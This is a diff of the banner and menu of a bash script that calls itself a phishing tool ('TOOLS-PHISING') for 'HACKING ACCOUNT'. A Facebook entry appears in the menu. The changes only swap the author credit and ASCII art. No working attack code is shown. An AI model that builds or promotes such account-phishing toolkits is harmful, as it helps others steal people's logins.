@@ -7,23 +7,23 @@ me='\033[31;1m' #merah
 pu='\033[37;1m' #putih
 ku='\033[33;1m' #kuning
 toilet -f future "TOOLS-PHISING" | lolcat
-echo $pur"Author : BLACK-IT"
+echo $pur"Author : Mr.J"
 echo $pur"____________________________________"
 toilet -f future "WELCOME TO TOOLS BLACK-IT"
 toilet -f term "   /\_/\ " | lolcat
 toilet -f term " =[ •~• ]= " | lolcat
 toilet -f term "    [\]_" | lolcat
-toilet -f term "    //   •       •" | lolcat
-toilet -f term "           •   •   •" | lolcat
-toilet -f term "             •       •" | lolcat
+toilet -f term "  |\    /| " | lolcat
+toilet -f term "  | \  / | " | lolcat
+toilet -f term "  |  \/  | " | lolcat
 echo $i "BLACK-IT"
 echo $i "TOOLS-PHISING"
 echo $pur"____________________________________"
 sleep 1
 echo
-echo $i" Author : Mr.J :"
-echo $pur"[" $ku"?" $pur"]" $ku" MR.J BLACK-IT"
-echo $pur"[" $ku"?" $pur"]" $ku" HACKING ACCOUNT"
+echo $i"BY MR.J TOOLS PHISING BLACK-IT"
+echo $pur"[" $ku"?" $pur"]" $ku"MR.J BLACK-IT"
+echo $pur"[" $ku"?" $pur"]" $ku"HACKING ACCOUNT"
 echo $pur"____________________________________"
 echo $pur"["$ku"1"$pur"]"$ku" INSTALL ALL MODULES NEEDED"
 echo $pur"["$ku"2"$pur"]"$ku" FACEBOOK SECURITY"
